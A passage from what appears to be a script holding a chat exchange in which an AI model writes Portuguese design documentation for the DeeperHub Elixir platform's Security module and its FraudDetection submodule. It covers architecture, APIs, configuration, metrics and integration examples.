│   ├── security_cache.ex
│   └── security_cache_supervisor.ex
├── config/                           # Configurações específicas de Segurança (ex: IPFirewallConfig)
│   └── ip_firewall_config.ex
├── csrf_protection/                  # Proteção CSRF
│   └── ...
├── data_masking/                     # Mascaramento de Dados
│   └── ...
├── ddos_protection/                  # Proteção DDoS
│   └── ...
├── device_fingerprint.ex             # Lógica de Fingerprint de Dispositivo
├── device.ex                         # Schema de Dispositivo
├── fraud_detection/                  # Detecção de Fraude
│   └── ...
├── geo_location_service.ex           # Serviço de Geolocalização (se não for módulo próprio)
├── hashing/                          # Hashing (se não usar apenas Core.Encryption)
│   └── ...
├── integrations/                     # Integrações do módulo Security com outros sistemas
│   ├── audit_integration.ex
│   ├── event_integration.ex
│   ├── rbac_integration.ex
│   └── ... (RiskAuth, RiskFraud, RiskNotification)
├── intrusion_detection/              # Detecção de Intrusão
│   └── ...
├── log_sanitizer.ex                  # Saneador de Logs
├── monitoring/                       # Monitoramento de Segurança
│   └── ...
├── path_traversal_protection/        # Proteção contra Path Traversal
│   └── ...
├── policy/                           # Gerenciamento de Políticas de Segurança
│   ├── security_policy_authorization.ex
│   └── security_policy_manager.ex
├── response_sanitizer.ex             # Saneador de Respostas
├── risk_assessment/                  # Avaliação de Risco
│   └── ...
├── sql_injection_protection/         # Proteção contra Injeção SQL
│   └── ...
├── supervisor.ex                     # Supervisor principal do módulo Security
├── telemetry.ex                      # Telemetria do módulo Security
├── unified_supervisor.ex             # Supervisor unificado do módulo Security
└── xss_protection/                   # Proteção XSS
    └── ...
```

### 3.3. Decisões de Design Importantes

*   **Defesa em Profundidade:** Múltiplas camadas de segurança são aplicadas.
*   **Modularidade:** Cada aspecto da segurança é tratado por um submódulo especializado, facilitando a manutenção e atualização.
*   **Configurabilidade:** As políticas e limiares de segurança são altamente configuráveis via `SecurityPolicyManager` e `Core.ConfigManager`.
*   **Observabilidade:** Eventos de segurança, métricas e logs detalhados são essenciais para entender ameaças e respostas.
*   **Integração com RBAC:** O acesso a funcionalidades de gerenciamento de segurança e a sensibilidade das políticas são controlados por permissões.

## 🛠️ 4. Casos de Uso Principais

*   **Verificação de Segurança de uma Requisição Web:**
    *   Um plug de segurança no pipeline Phoenix chama `DeeperHub.Security.assess_request_risk(conn)`.
    *   `SecurityManager` orquestra chamadas para:
        *   `DdosProtection.check_request/3`
        *   `BruteForceProtection.check_attempt/2` (para o IP)
        *   `SqlInjectionProtection.check_string/2` (para parâmetros)
        *   `XssProtection.check_string/2` (para parâmetros)
        *   `PathTraversalProtection.check_path/2`
    *   Retorna um nível de risco agregado e ações recomendadas (permitir, bloquear, exigir CAPTCHA).
*   **Análise de Tentativa de Login:**
    *   `DeeperHub.Auth` chama `DeeperHub.Security.analyze_login_attempt(user_id, device_info, location_data, context)`.
    *   `SecurityManager` delega para `RiskAssessment`, `FraudDetection`, `BehavioralAnalysis`, `GeoLocationService` para avaliar o risco.
*   **Administrador Bloqueia um IP:**
    *   Através do `DeeperHub.Console` ou UI Admin, chama `DeeperHub.Security.block_ip(ip_address, reason, duration)`.
    *   `SecurityManager` delega para `IpFirewallService` (ou similar), que atualiza o `SecurityCache` e o storage.
*   **Sistema Detecta Atividade de Fraude em Transação:**
    *   `DeeperHub.Security.FraudDetection` detecta uma transação fraudulenta.
    *   `FraudDetection` publica um evento (`fraud.detected`).
    *   `DeeperHub.Security.Monitoring` recebe o evento e gera um alerta.
    *   `DeeperHub.Notifications` envia o alerta para a equipe de segurança.

## 🌊 5. Fluxos Importantes

### Fluxo de Avaliação de Risco de uma Operação Sensível

1.  **Módulo de Domínio:** Antes de executar uma operação crítica (ex: `DeeperHub.Accounts.update_sensitive_profile_field`), chama `DeeperHub.Security.assess_operation_risk(user_id, :profile_update, context_data)`.
2.  **`DeeperHub.Security.SecurityManager`:**
    *   Coleta informações adicionais (histórico do usuário, reputação do IP, etc.).
    *   Chama `DeeperHub.Security.RiskAssessment.assess_risk(user_id, operation_type, full_context)`.
3.  **`DeeperHub.Security.RiskAssessment.RiskAssessmentService`:**
    *   Usa `RiskFactorCalculator` para obter fatores de risco básicos (localização, dispositivo).
    *   Usa `AdvancedRiskFactors` para obter fatores de comportamento, velocidade de viagem, etc.
    *   Usa `RiskCalculator` para combinar os fatores e seus pesos (definidos em `SecurityPolicyManager`) e calcular um `risk_score`.
    *   Usa `RiskActionRecommender` para determinar ações recomendadas com base no score e nas políticas.
4.  **`DeeperHub.Security.SecurityManager`:** Retorna o resultado da avaliação (ex: `{:ok, %{risk_level: :high, actions: [:require_mfa, :notify_user]}}`).
5.  **Módulo de Domínio:** Age conforme as recomendações (ex: redireciona para fluxo MFA).

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security`)

A API da fachada `DeeperHub.Security` seria mais focada em orquestração e verificações de alto nível. As APIs detalhadas residem nas fachadas dos submódulos.

### 6.1. `DeeperHub.Security.assess_request_risk(conn_or_context :: map() | Plug.Conn.t()) :: {:ok, %{risk_level: atom(), recommended_action: atom(), details: map()}} | {:error, term()}`

*   **Descrição:** Avalia o risco de uma requisição HTTP ou um contexto genérico.
*   **Parâmetros:**
    *   `conn_or_context`: A `Plug.Conn` ou um mapa com dados da requisição (IP, headers, path, params).
*   **Retorno:**
    *   `risk_level`: `:low`, `:medium`, `:high`, `:critical`.
    *   `recommended_action`: `:allow`, `:challenge_captcha`, `:require_mfa`, `:block`, `:log_suspicious`.
    *   `details`: Fatores que contribuíram para a avaliação.

### 6.2. `DeeperHub.Security.analyze_login_attempt(user_id :: String.t() | nil, device_info :: map(), location_data :: map(), context :: map()) :: {:ok, LoginAnalysis.t()} | {:error, term()}`

*   **Descrição:** Analisa uma tentativa de login de forma abrangente. (Delega para `SecurityManager`).
*   **`LoginAnalysis.t()`:** `%{risk_score: float(), risk_level: atom(), actions: list(atom()), details: map()}`.

### 6.3. `DeeperHub.Security.assess_operation_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context :: map()) :: {:ok, OperationRisk.t()} | {:error, term()}`

*   **Descrição:** Avalia o risco de uma operação de negócio específica.
*   **`operation_type`:** Ex: `:transfer_funds`, `:update_profile_email`, `:delete_account`.
*   **`operation_data`:** Dados específicos da operação (ex: valor da transferência, novo email).
*   **`OperationRisk.t()`:** Similar a `LoginAnalysis.t()`.

### 6.4. `DeeperHub.Security.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Bloqueia um endereço IP. (Delega para `IpFirewallService` ou similar).

### 6.5. `DeeperHub.Security.is_ip_blocked?(ip_address :: String.t()) :: boolean()`

*   **Descrição:** Verifica se um IP está bloqueado.

*(Outras funções de conveniência podem ser adicionadas conforme necessário, mas o grosso da API estará nos submódulos.)*

## ⚙️ 7. Configuração

As configurações dos submódulos de segurança são gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou pelo `DeeperHub.Security.Policy.SecurityPolicyManager`.

Exemplos de chaves de configuração (os submódulos teriam suas próprias seções detalhadas):

*   `[:security, :default_action_on_high_risk]` (Atom): Ação padrão para eventos de alto risco (ex: `:block`).
*   `[:security, :log_sanitizer, :enabled]` (Boolean).
*   `[:security, :response_sanitizer, :enabled]` (Boolean).
*   `[:security, :device_fingerprint, :trusted_device_expiry_days]` (Integer).
*   **Políticas específicas (via `SecurityPolicyManager`):**
    *   Limiares para detecção de fraude.
    *   Número de tentativas para bloqueio por força bruta.
    *   Regras de detecção de intrusão.
    *   Pesos para fatores de risco.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.EncryptionService`.
*   `DeeperHub.Auth`: Para obter informações de usuário autenticado e sessões.
*   `DeeperHub.MFA`, `DeeperHub.OAuth`, `DeeperHub.RBAC`.
*   `DeeperHub.Audit`: Para registrar eventos de segurança.
*   `DeeperHub.Notifications`: Para enviar alertas de segurança.
*   Todos os submódulos de `DeeperHub.Security.*`.

### 8.2. Bibliotecas Externas

*   Dependências específicas de cada submódulo (ex: bibliotecas para análise de User-Agent, GeoIP, algoritmos de ML para fraude/comportamento).
*   Bibliotecas de sanitização HTML/SQL (ex: `HtmlSanitizeEx`, `Moebius` para Ecto).

## 🤝 9. Como Usar / Integração

*   **Plugs de Segurança (Phoenix):** Criar plugs para serem adicionados aos pipelines do router para verificações de segurança em cada requisição (DDoS, Rate Limit, validação de entrada básica).
    ```elixir
    pipeline :api_secure do
      plug DeeperHubWeb.Plugs.ApiSecurityChecks # Plug que chama DeeperHub.Security.assess_request_risk
      plug DeeperHubWeb.Plugs.AuthApiTokenPlug
      # ...
    end
    ```
*   **Verificações em Controllers/Serviços:**
    ```elixir
    def process_critical_action(user_id, params, context) do
      case DeeperHub.Security.assess_operation_risk(user_id, :critical_action_x, params, context) do
        {:ok, %{risk_level: risk_level, recommended_action: action}} when risk_level in [:low, :medium] and action == :allow ->
          # Prosseguir com a ação
          # ...
        {:ok, %{recommended_action: :require_mfa}} ->
          {:error, :mfa_required_for_security}
        _ ->
          DeeperHub.Security.Monitoring.generate_alert(
            %{type: :high_risk_operation_denied, user_id: user_id, operation: :critical_action_x},
            context
          )
          {:error, :operation_too_risky}
      end
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Cada submódulo de segurança deve ter seu próprio conjunto extensivo de testes unitários e de integração.
*   Testes de integração para o `SecurityManager` verificando a orquestração correta entre submódulos.
*   Cenários de ataque simulados para validar a eficácia das proteções (ex: testes de penetração automatizados básicos).
*   Localização: `test/deeper_hub/security/` e subdiretórios para cada componente.

### 10.2. Métricas

Métricas de alto nível para o `SecurityManager` e métricas detalhadas nos submódulos.
*   `deeper_hub.security.requests.assessed.count` (tags: `risk_level`, `action_taken`)
*   `deeper_hub.security.operations.risk_assessed.count` (tags: `operation_type`, `risk_level`)
*   `deeper_hub.security.active_threats.gauge` (Gauge): Uma métrica agregada indicando o nível de ameaça atual ao sistema.
*   *(Métricas específicas de cada submódulo, como `fraud_detection.analyzed.count`, `brute_force.ip_blocked.count`, etc.)*

### 10.3. Logs

*   **Nível INFO:** Operações de segurança bem-sucedidas com baixo risco.
*   **Nível WARNING:** Detecções de risco médio, bloqueios temporários, atividades suspeitas que não justificam bloqueio imediato.
*   **Nível ERROR/CRITICAL:** Detecções de alto/crítico risco, bloqueios permanentes, falhas nos sistemas de segurança.
*   **Auditoria:** Todas as decisões de segurança, bloqueios, alterações de política e detecções significativas devem ser auditadas.

### 10.4. Telemetria

Eventos Telemetry para operações chave de orquestração e decisão do `SecurityManager`:
*   `[:deeper_hub, :security, :request_assessment, :start | :stop | :exception]`
    *   Metadados: `%{path: path, ip: ip, result_risk_level: level, action_taken: action}`
*   `[:deeper_hub, :security, :operation_assessment, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, operation: type, result_risk_level: level, action_taken: action}`
*   *(Submódulos emitirão seus próprios eventos Telemetry detalhados).*

## ❌ 11. Tratamento de Erros

*   Falhas em um submódulo de segurança não devem, idealmente, derrubar a avaliação de segurança como um todo, mas podem aumentar o nível de risco ou levar a uma ação padrão mais segura (ex: \"negar por padrão\").
*   O `SecurityManager` deve ser resiliente a falhas parciais dos componentes que orquestra.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo Security)

*   **Configuração Segura:** As políticas e configurações dos submódulos de segurança devem ser protegidas contra alterações não autorizadas (`SecurityPolicyManager` com RBAC).
*   **Segredo de Chaves:** Chaves usadas para HMAC, criptografia, etc., devem ser gerenciadas de forma segura pelo `Core.EncryptionService`.
*   **Evitar Falsos Positivos:** Embora a segurança seja prioritária, as regras e limiares devem ser calibrados para minimizar o impacto em usuários legítimos.
*   **Performance:** As verificações de segurança não devem introduzir latência excessiva nas requisições. O uso de caches e otimizações é vital.

## 🧑‍💻 13. Contribuição

*   Qualquer adição ou alteração a um submódulo de segurança deve considerar seu impacto na postura de segurança geral e ser coordenada através do `SecurityManager` se afetar múltiplas áreas.
*   Privilegie a falha segura (fail-closed) para mecanismos de proteção.
*   Mantenha os testes atualizados, especialmente com novos vetores de ataque ou cenários de segurança.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um \"Security Dashboard\" que consolide informações de todos os submódulos.
*   [ ] Adicionar playbooks de resposta a incidentes automatizados para certos tipos de alertas.
*   [ ] Integração com feeds de inteligência de ameaças externas (ex: listas de IPs maliciosos conhecidos).
*   [ ] Desenvolver capacidades de aprendizado de máquina mais avançadas para `BehavioralAnalysis` e `FraudDetection` para adaptação dinâmica a novas ameaças.
*   [ ] Permitir que administradores configurem \"modos de segurança\" globais (ex: modo de alta segurança durante um ataque percebido, que aperta todos os limiares).

---

*Última atualização: 2025-05-11*

---

Este módulo `DeeperHub.Security` é um grande orquestrador! Ele depende de muitos outros submódulos bem definidos para funcionar.

Podemos agora focar em um desses submódulos de segurança, como `DeeperHub.Security.FraudDetection` ou `DeeperHub.Security.BruteForceProtection`, ou ir para um outro módulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos detalhar o `DeeperHub.Security.FraudDetection`, um componente vital dentro do módulo `Security`.

---

# Módulo: `DeeperHub.Security.FraudDetection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.FraudDetection`

O módulo `DeeperHub.Security.FraudDetection` é dedicado a identificar, prevenir e gerenciar atividades fraudulentas dentro do sistema DeeperHub. Ele analisa diversos tipos de interações e transações dos usuários, aplicando um conjunto de regras, heurísticas e, potencialmente, modelos de aprendizado de máquina para detectar comportamentos que se desviam do normal ou que correspondem a padrões de fraude conhecidos.

As principais áreas de análise incluem tentativas de login, alterações de perfil, transações financeiras (se aplicável), uso da API e anomalias biométricas. O objetivo é minimizar perdas financeiras, proteger contas de usuários contra comprometimento e manter a integridade da plataforma. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Análise de Atividades para Detecção de Fraude:**
    *   **Login (`analyze_login/1`):** Avaliar o risco de tentativas de login com base em fatores como localização, dispositivo, histórico, velocidade de viagem, IPs suspeitos.
    *   **Alterações de Perfil (`analyze_profile_changes/1`):** Detectar alterações suspeitas em dados críticos do perfil (ex: email, telefone, senha, endereço) feitas rapidamente ou de locais/dispositivos incomuns.
    *   **Transações (se aplicável):** Monitorar transações financeiras ou de itens de valor para padrões fraudulentos (ex: valores incomuns, frequência, destinatários suspeitos).
    *   **Uso de API (`analyze_api_usage/1`):** Identificar abuso de API, scraping ou atividades automatizadas maliciosas.
    *   **Anomalias Biométricas (`record_biometric_anomaly/1`):** Receber e processar alertas do módulo `DeeperHub.Biometrics` sobre desvios comportamentais.
*   **Gerenciamento de Regras de Detecção:**
    *   Permitir a criação, atualização, exclusão e consulta de regras de detecção de fraude (via `RulesManagerService`).
    *   Suportar diferentes tipos de condições e pesos para as regras.
*   **Cálculo de Pontuação de Risco (Risk Scoring):**
    *   Atribuir uma pontuação de risco a cada evento/atividade analisada com base nas regras acionadas e outros fatores.
    *   Classificar o risco em níveis (ex: baixo, médio, alto, crítico) (via `RiskCalculatorService`).
*   **Registro de Detecções:**
    *   Armazenar todas as detecções de fraude, incluindo detalhes, contexto, pontuação de risco e status (via `DetectionRecorderService`).
*   **Gerenciamento de Casos de Fraude:**
    *   Permitir que analistas de segurança revisem detecções, adicionem notas e atualizem o status (ex: falso positivo, fraude confirmada, resolvido) (via `Core` ou `DetectionRecorderService`).
*   **Notificações e Alertas:**
    *   Notificar a equipe de segurança e/ou usuários sobre detecções de fraude de alta criticidade (via `FraudNotifierService` e `DeeperHub.Notifications`).
*   **Integração com Outros Módulos de Segurança:**
    *   Utilizar dados do `LoginLocation`, `DeviceFingerprint`, `BehavioralAnalysis` para enriquecer a análise.
    *   Fornecer informações para o `SecurityManager` tomar decisões (ex: bloquear usuário, exigir MFA adicional).
*   **Relatórios e Estatísticas:**
    *   Gerar relatórios sobre tendências de fraude, eficácia das regras, etc.
    *   Fornecer estatísticas sobre detecções e níveis de risco.

## 🏗️ 3. Arquitetura e Design

O `DeeperHub.Security.FraudDetection` é um módulo complexo que geralmente é composto por vários serviços e componentes especializados.

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.FraudDetection` (Fachada Pública):**
    *   Ponto de entrada para o sistema de detecção de fraude.
    *   Delega chamadas para o `FraudDetectionService` ou diretamente para serviços especializados.
2.  **`DeeperHub.Security.FraudDetection.Services.DefaultFraudDetectionService` (ou `FraudDetectionCoreService`):**
    *   Serviço central que orquestra o processo de análise.
    *   Recebe dados de eventos, aplica regras, calcula riscos e registra detecções.
    *   Pode ser um GenServer para gerenciar estado ou executar tarefas assíncronas.
3.  **`DeeperHub.Security.FraudDetection.Services.RulesManagerService` (GenServer):**
    *   Responsável por carregar, armazenar e fornecer acesso às regras de detecção de fraude.
    *   Permite a atualização dinâmica de regras.
4.  **`DeeperHub.Security.FraudDetection.Services.RiskCalculatorService` (GenServer ou Módulo Funcional):**
    *   Contém a lógica para calcular a pontuação de risco com base nos fatores identificados e nos pesos das regras.
5.  **`DeeperHub.Security.FraudDetection.Services.DetectionRecorderService` (GenServer):**
    *   Responsável por persistir os registros de detecções de fraude.
    *   Gerencia o ciclo de vida das detecções (status, notas).
6.  **`DeeperHub.Security.FraudDetection.Services.FraudNotifierService` (GenServer):**
    *   Responsável por enviar notificações e alertas com base nas detecções.
7.  **`DeeperHub.Security.FraudDetection.Schema.FraudDetectionSchema`:**
    *   Schema Ecto para armazenar os registros de detecção de fraude.
8.  **`DeeperHub.Security.FraudDetection.Schema.RiskFactors` e `RiskScore` (Opcional):**
    *   Schemas para detalhar os fatores que contribuíram para uma pontuação de risco.
9.  **Workers (`AnalysisWorker`, `CleanupWorker`):**
    *   `AnalysisWorker`: Para análises periódicas de padrões de fraude mais complexos ou em lote.
    *   `CleanupWorker`: Para limpar dados antigos de detecção.
10. **Integrações:**
    *   `AuditIntegration`: Para logar eventos de fraude.
    *   `EventIntegration`: Para publicar/subscrever eventos relacionados à fraude.
    *   `MetricsReporter` ou `Telemetry`: Para registrar métricas.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/fraud_detection/
├── fraud_detection.ex                # Fachada Pública
│
├── services/
│   ├── default_fraud_detection_service.ex # Serviço orquestrador
│   ├── rules_manager_service.ex
│   ├── risk_calculator_service.ex
│   ├── detection_recorder_service.ex
│   └── fraud_notifier_service.ex
│
├── schemas/
│   ├── fraud_detection_schema.ex
│   ├── risk_factors.ex               # Opcional
│   └── risk_score.ex                 # Opcional
│
├── rules/                            # Onde as definições de regras podem residir
│   └── login_rules.ex
│
├── integrations/
│   ├── audit_integration.ex
│   └── event_integration.ex          # (Pode ser gerenciado centralmente em Security/Integrations)
│
├── workers/
│   ├── analysis_worker.ex
│   └── cleanup_worker.ex
│
├── supervisor.ex
└── telemetry.ex                      # (ou MetricsReporter.ex)
```

### 3.3. Decisões de Design Importantes

*   **Sistema Baseado em Regras Extensível:** A capacidade de adicionar e modificar regras dinamicamente é crucial.
*   **Pontuação de Risco Flexível:** O `RiskCalculatorService` deve permitir diferentes modelos de pontuação e ponderação de fatores.
*   **Feedback Loop:** O sistema deve permitir que analistas marquem detecções como falsos positivos, o que pode ser usado para treinar/ajustar modelos ou regras.
*   **Processamento em Tempo Real e em Lote:** Algumas análises precisam ser em tempo real (ex: login), enquanto outras podem ser feitas em lote (ex: análise de padrões históricos).

## 🛠️ 4. Casos de Uso Principais

*   **Tentativa de Login de um Novo Dispositivo e Localização:**
    *   `DeeperHub.Auth` envia dados do login para `FraudDetection.analyze_login/1`.
    *   O serviço aplica regras como \"novo dispositivo\", \"nova localização\", \"viagem impossível\".
    *   Calcula um score de risco. Se alto, pode recomendar MFA adicional ou bloquear temporariamente.
*   **Usuário Altera Email e Senha Rapidamente:**
    *   `DeeperHub.Accounts` envia dados das alterações para `FraudDetection.analyze_profile_changes/1`.
    *   Regras para \"múltiplas alterações sensíveis em curto período\" são acionadas.
    *   Score de risco alto -> notificação para o usuário sobre as alterações.
*   **Detecção de Padrão de Abuso de API:**
    *   `DeeperHub.API` envia dados de uso para `FraudDetection.analyze_api_usage/1`.
    *   Regras de \"alta frequência de requisições\" ou \"acesso a endpoints sensíveis de forma incomum\" são acionadas.
    *   Risco alto -> pode levar a rate limiting mais agressivo ou bloqueio temporário do cliente API.

## 🌊 5. Fluxos Importantes

### Fluxo de Análise de Fraude para um Evento (ex: Login)

1.  **Evento de Entrada:** `FraudDetection.analyze_login(login_info)` é chamado.
2.  **`DefaultFraudDetectionService`:**
    *   Coleta dados contextuais adicionais (histórico do usuário, reputação do IP, etc.).
    *   Recupera as regras relevantes para o tipo de evento \"login\" do `RulesManagerService`.
3.  **Aplicação de Regras:**
    *   Para cada regra, avalia se as condições são atendidas com base nos dados do evento e contexto.
    *   Coleta os fatores de risco e as pontuações parciais das regras acionadas.
4.  **`RiskCalculatorService`:**
    *   Recebe os fatores de risco e suas pontuações/pesos.
    *   Calcula a pontuação de risco final e o nível de risco (baixo, médio, alto, crítico).
5.  **`DetectionRecorderService`:**
    *   Se a pontuação de risco exceder um limiar mínimo para registro, um novo `FraudDetectionSchema` é criado e persistido com todos os detalhes.
6.  **`FraudNotifierService`:**
    *   Se o nível de risco for alto o suficiente para justificar uma notificação imediata, envia alertas para a equipe de segurança ou para o usuário (via `DeeperHub.Notifications`).
7.  **Resposta:** O `DefaultFraudDetectionService` retorna o resultado da análise (nível de risco, ID da detecção, ações recomendadas) para o chamador.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Security.FraudDetection`)

*(Muitas já foram descritas na documentação original. Foco em clareza e exemplos.)*

### 6.1. `DeeperHub.Security.FraudDetection.analyze_login(login_info :: map()) :: {:ok, FraudAnalysisResult.t()} | {:error, term()}`

*   **Descrição:** Analisa uma tentativa de login para detectar fraude.
*   **`login_info`:** `%{user_id: String.t(), ip_address: String.t(), user_agent: String.t(), location: map() | nil, success: boolean()}`
*   **`FraudAnalysisResult.t()`:** `%{risk_score: float(), risk_level: atom(), detection_id: String.t() | nil, details: map()}`
*   **Exemplo:**
    ```elixir
    login_data = %{user_id: \"u1\", ip_address: \"1.2.3.4\", user_agent: \"...\", success: true}
    case FraudDetection.analyze_login(login_data) do
      {:ok, result} -> Logger.info(\"Análise de login: #{inspect(result)}\")
      {:error, e} -> Logger.error(\"Erro na análise de login: #{inspect(e)}\")
    end
    ```

### 6.2. `DeeperHub.Security.FraudDetection.add_rule(rule_definition :: map()) :: {:ok, Rule.t()} | {:error, term()}`

*   **Descrição:** Adiciona uma nova regra de detecção de fraude.
*   **`rule_definition`:** `%{name: String.t(), detection_type: atom(), conditions: list(map()), action_score: integer(), enabled: boolean()}`
*   **Exemplo:**
    ```elixir
    rule = %{name: \"High value transfer from new device\", detection_type: :transaction, conditions: [...], action_score: 70}
    FraudDetection.add_rule(rule)
    ```

### 6.3. `DeeperHub.Security.FraudDetection.update_detection_status(detection_id :: String.t(), status :: atom(), reviewer_id :: String.t(), notes :: String.t() | nil) :: {:ok, FraudDetectionSchema.t()} | {:error, term()}`

*   **Descrição:** Atualiza o status de uma detecção (ex: `:reviewed`, `:false_positive`, `:confirmed_fraud`).

*(Outras funções como `analyze_profile_changes/1`, `analyze_transaction/1`, `get_rules/1`, `list_detections/1` seguiriam um padrão similar.)*

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :fraud_detection, :enabled]`** (Boolean): Habilita/desabilita o sistema de detecção de fraude. (Padrão: `true`)
*   **`[:security, :fraud_detection, :default_risk_thresholds]`** (Map): Limiares padrão para classificar scores de risco (ex: `%{low: 20, medium: 50, high: 75, critical: 90}`).
*   **`[:security, :fraud_detection, :rules_source]`** (Atom ou String): Fonte para carregar as regras de detecção (ex: `:config_file`, `:database`, ou caminho para um arquivo).
*   **`[:security, :fraud_detection, :rules_file_path]`** (String): Caminho para o arquivo de regras, se `rules_source` for `:config_file`.
*   **`[:security, :fraud_detection, :record_all_analyses]`** (Boolean): Se deve registrar todas as análises, mesmo as de baixo risco. (Padrão: `false`, registrar apenas acima de um limiar)
*   **`[:security, :fraud_detection, :min_score_to_record]`** (Integer): Pontuação mínima para registrar uma detecção. (Padrão: `30`)
*   **`[:security, :fraud_detection, :notification_thresholds]`** (Map): Limiares de risco para diferentes canais de notificação (ex: `%{email: :high, sms: :critical}`).
*   **`[:security, :fraud_detection, :cleanup_worker, :retention_days]`** (Integer): Por quantos dias manter os registros de detecção. (Padrão: `180`)
*   **`[:security, :fraud_detection, :analysis_worker, :batch_size]`** (Integer): Tamanho do lote para análise em background.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth`: Para informações de usuário e sessão.
*   `DeeperHub.Accounts`: Para dados de perfil.
*   `DeeperHub.API`: Para dados de uso da API.
*   `DeeperHub.Biometrics`: Para dados de anomalias biométricas.
*   `DeeperHub.Security.LoginLocation`: Para dados de localização.
*   `DeeperHub.Security.DeviceFingerprint`: Para dados de dispositivo.
*   `DeeperHub.Security.RiskAssessment`: Pode ser usado como um dos insumos para a pontuação de fraude ou ser o resultado dela.
*   `DeeperHub.Notifications`: Para enviar alertas.
*   `DeeperHub.Audit`: Para registrar detecções e ações.

### 8.2. Bibliotecas Externas

*   Bibliotecas de Machine Learning (opcional, ex: `Nx`, `Axon`, `Scholar`) se modelos de ML forem usados.
*   Bibliotecas para processamento de regras (opcional, ex: `RuleEx`).

## 🤝 9. Como Usar / Integração

Os módulos de domínio (Accounts, API, etc.) devem chamar as funções `analyze_*` da fachada `DeeperHub.Security.FraudDetection` quando eventos relevantes ocorrem.

**Exemplo em `DeeperHub.Accounts` ao atualizar email:**
```elixir
def update_email(user, new_email, context_info) do
  # ... (lógica de atualização do email) ...

  # Análise de fraude
  profile_change_info = %{
    user_id: user.id,
    changes: %{email: new_email},
    ip_address: context_info.ip_address,
    # ... outros dados de contexto
  }
  case DeeperHub.Security.FraudDetection.analyze_profile_changes(profile_change_info) do
    {:ok, %{risk_level: risk_level, detection_id: detection_id}} when risk_level in [:high, :critical] ->
      Logger.warn(\"Alta suspeita de fraude na alteração de email para user_id: #{user.id}\", detection_id: detection_id)
      # Pode-se optar por bloquear a alteração, exigir verificação adicional, etc.
      # ...
    {:ok, _low_or_medium_risk} ->
      # Prossegue normalmente
      # ...
    {:error, reason} ->
      Logger.error(\"Erro na análise de fraude para alteração de email: #{inspect(reason)}\")
      # Lidar com o erro, talvez prosseguir com cautela ou negar.
  end
  # ...
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função de análise (`analyze_login`, `analyze_transaction`, etc.) com diversos cenários (normal, suspeito, fraudulento).
*   Testar a lógica de aplicação de regras e cálculo de score de risco.
*   Testar o registro e atualização de status de detecções.
*   Testar a funcionalidade dos workers (`AnalysisWorker`, `CleanupWorker`).
*   Localização: `test/deeper_hub/security/fraud_detection/`.

### 10.2. Métricas

*   `deeper_hub.security.fraud_detection.analyzed.count` (tags: `type` (`login`, `transaction`, etc.))
*   `deeper_hub.security.fraud_detection.detected.count` (tags: `type`, `risk_level`)
*   `deeper_hub.security.fraud_detection.analysis.duration_ms` (Histograma, tags: `type`)
*   `deeper_hub.security.fraud_detection.rules.triggered.count` (tags: `rule_id`)
*   `deeper_hub.security.fraud_detection.false_positives.count` (tags: `type`)
*   `deeper_hub.security.fraud_detection.average_risk_score.gauge` (tags: `type`)

### 10.3. Logs

*   **Nível INFO:** Análise de eventos com baixo risco, atualizações de status de detecção.
*   **Nível WARNING:** Detecções de risco médio ou alto, acionamento de regras importantes.
*   **Nível ERROR:** Falhas na análise, erros ao registrar detecções, detecções de risco crítico.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :fraud_detection, :analysis, :start | :stop | :exception]`
    *   Metadados: `%{type: type, user_id: id, input_data_sample: sample}`
*   `[:deeper_hub, :security, :fraud_detection, :rule_evaluation, :start | :stop | :exception]`
    *   Metadados: `%{rule_id: id, conditions_met: boolean}`
*   `[:deeper_hub, :security, :fraud_detection, :detection_recorded]`
    *   Metadados: `%{detection_id: id, type: type, risk_level: level, risk_score: score}`
*   `[:deeper_hub, :security, :fraud_detection, :status_updated]`
    *   Metadados: `%{detection_id: id, new_status: status, reviewer_id: id}`

## ❌ 11. Tratamento de Erros

*   Falhas na análise de fraude não devem impedir a operação principal do usuário, mas devem ser logadas e, possivelmente, sinalizar a operação para revisão manual ou aplicar uma política de \"negar por padrão\" se o risco for desconhecido e alto.
*   Erros de persistência de detecções ou atualização de regras devem ser tratados e logados, com mecanismos de retry se apropriado.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Segurança das Regras:** O mecanismo de atualização de regras (`RulesManagerService`) deve ser protegido para evitar que regras maliciosas sejam injetadas.
*   **Dados de Análise:** Os dados usados para análise de fraude podem ser sensíveis. Garantir que sejam manuseados com segurança e que o acesso aos resultados da análise seja restrito.
*   **Falsos Positivos:** O sistema deve ser ajustado para minimizar falsos positivos, que podem impactar negativamente a experiência do usuário. Um processo claro para revisar e corrigir falsos positivos é essencial.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novas regras, documente claramente suas condições e o racional por trás delas.
*   Teste exaustivamente novas regras contra dados históricos para avaliar seu impacto e precisão.
*   Considere a performance ao adicionar regras complexas ou que exigem muitas consultas.

